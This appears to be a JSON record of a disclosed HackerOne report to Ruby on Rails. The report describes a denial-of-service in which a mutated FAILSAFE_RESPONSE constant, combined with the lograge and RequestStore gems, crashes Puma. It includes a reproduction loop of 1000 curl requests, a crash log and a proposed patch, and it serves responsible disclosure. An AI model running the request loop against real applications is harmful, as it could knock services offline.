@@ -1,0 +1,117 @@
+{
+  "id": 1300802,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzAwODAy",
+  "url": "https://hackerone.com/reports/1300802",
+  "title": "Possible DOS in app with crashing `exceptions_app`",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-08-11T19:49:56.292Z",
+  "submitted_at": "2021-08-11T19:49:56.339Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ghiculescu",
+    "url": "/ghiculescu",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-06-28T00:42:04.824Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-06-28T00:41:54.734Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Make a new Rails app, add the `lograge` gem.\n\n```ruby\n# config/application.rb\nconfig.exceptions_app = self.routes\nconfig.lograge.enabled = true\n```\n\n```ruby\n# config/routes.rb\n\nRails.application.routes.draw do\n  root to: \"site#index\"\n\n  get 'errors/not_found'\n  match \"/404\", to: \"errors#not_found\", via: :all\nend\n```\n\n```ruby\n# app/controllers/errors_controller.rb\n\nclass ErrorsController < ApplicationController\n  def not_found\n    render status: 404 # the view can do whatever, it doesn't matter\n  end\nend\n```\n\nStart the server as a production app (eg. it would start on Heroku): `RAILS_ENV=production RACK_ENV=production SECRET_KEY_BASE=foo RAILS_SERVE_STATIC_FILES=enabled RAILS_MAX_THREADS=2 RAILS_LOG_TO_STDOUT=enabled rails s`\n\nRun this script:\n\n```ruby\n1000.times.each do |n|\n  `curl -H \"Accept: application/xml\" -H \"Content-Type: application/xml\" -X GET http://localhost:3000///wp1/wp-includes/wlwmanifest.xml`\nend\n```\n\nAt some point (after 989 requests for me), Puma will crash:\n\n```\n2021-08-11 13:23:04 -0500 Rack app (\"GET ///wp1/wp-includes/wlwmanifest.xml\" - (127.0.0.1)): #<fatal: machine stack overflow in critical region>\n```\n\nSince it's a fatal Ruby error (which is unrecoverable) this leaves Puma in a zombie state, similar to https://github.com/puma/puma/issues/2552\n\nThe reason this crashes is:\n\n- [ActionDispatch::ShowExceptions](https://github.com/rails/rails/blob/main/actionpack/lib/action_dispatch/middleware/show_exceptions.rb#L55) returns a non-frozen const.\n- [lograge](https://github.com/roidrage/lograge/blob/master/lib/lograge/rails_ext/rack/logger.rb#L15) doesn't wrap this response in a `Rack::BodyProxy`. If you weren't using lograge, then Rails would do so [here](https://github.com/rails/rails/blob/main/railties/lib/rails/rack/logger.rb#L37). Before realising this could be a Rails security vulnerability, I made a PR for this here: https://github.com/roidrage/lograge/pull/333\n- [RequestStore](https://github.com/steveklabnik/request_store/blob/master/lib/request_store/middleware.rb#L21) mutates the response body. This causes the const in Rails to get mutated, it now is a `Rack::BodyProxy` with a reference to itself. Every time it gets returned, it gets mutated again and the object gets one layer bigger.  Before realising this could be a Rails security vulnerability, I made a PR for the mutation here: https://github.com/steveklabnik/request_store/pull/78\n- Eventually, we have an extremely large `Rack::BodyProxy` that references itself hundreds of times in memory. This is easy to make crash. In our case, [Rack::Sendfile](https://github.com/rack/rack/blob/master/lib/rack/sendfile.rb#L113) causes a `SystemStackError`, I think this happens because of how `BodyProxy` handles `respond_to_missing?`.\n\nI don't think this issue is unique to `lograge` + `RequestStore`. It can happen anywhere you have:\n\n- A middleware that mutates a response, and\n- `FAILSAFE_RESPONSE` (or another non-frozen const) being passed to that middleware, and\n- Something higher in the middleware stack that calls a missing method on the response.\n\nI was about to make a PR to Rails with this patch when it dawned on me that this could be a security issue:\n\n```diff\ndiff --git a/actionpack/lib/action_dispatch/middleware/show_exceptions.rb b/actionpack/lib/action_dispatch/middleware/show_exceptions.rb\nindex 0a7e895e59..d207765acc 100644\n--- a/actionpack/lib/action_dispatch/middleware/show_exceptions.rb\n+++ b/actionpack/lib/action_dispatch/middleware/show_exceptions.rb\n@@ -14,13 +14,14 @@ module ActionDispatch\n   # If the application returns a \"X-Cascade\" pass response, this middleware\n   # will send an empty response as result with the correct status code.\n   # If any exception happens inside the exceptions app, this middleware\n-  # catches the exceptions and returns a FAILSAFE_RESPONSE.\n+  # catches the exceptions and returns a failsafe response.\n   class ShowExceptions\n     FAILSAFE_RESPONSE = [500, { \"Content-Type\" => \"text/plain\" },\n       [\"500 Internal Server Error\\n\" \\\n        \"If you are the administrator of this website, then please read this web \" \\\n        \"application's log file and/or the web server's log file to find out what \" \\\n        \"went wrong.\"]]\n+    deprecate_constant :FAILSAFE_RESPONSE\n\n     def initialize(app, exceptions_app)\n       @app = app\n@@ -52,7 +53,15 @@ def render_exception(request, exception)\n         response[1][\"X-Cascade\"] == \"pass\" ? pass_response(status) : response\n       rescue Exception => failsafe_error\n         $stderr.puts \"Error during failsafe response: #{failsafe_error}\\n  #{failsafe_error.backtrace * \"\\n  \"}\"\n-        FAILSAFE_RESPONSE\n+        failsafe_response\n+      end\n+\n+      def failsafe_response\n+        [500, { \"Content-Type\" => \"text/plain\" },\n+          [\"500 Internal Server Error\\n\" \\\n+         \"If you are the administrator of this website, then please read this web \" \\\n+         \"application's log file and/or the web server's log file to find out what \" \\\n+         \"went wrong.\"]]\n       end\n\n       def pass_response(status)\n```\n\n## Impact\n\nIf you find an app that's configured as above you could bring it offline by making the same bad request enough times.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-07-28T00:41:54.816Z",
+  "allow_singular_disclosure_after": -87236058.6715504,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "zy9ard3",
+    "doublecreak",
+    "markh714"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
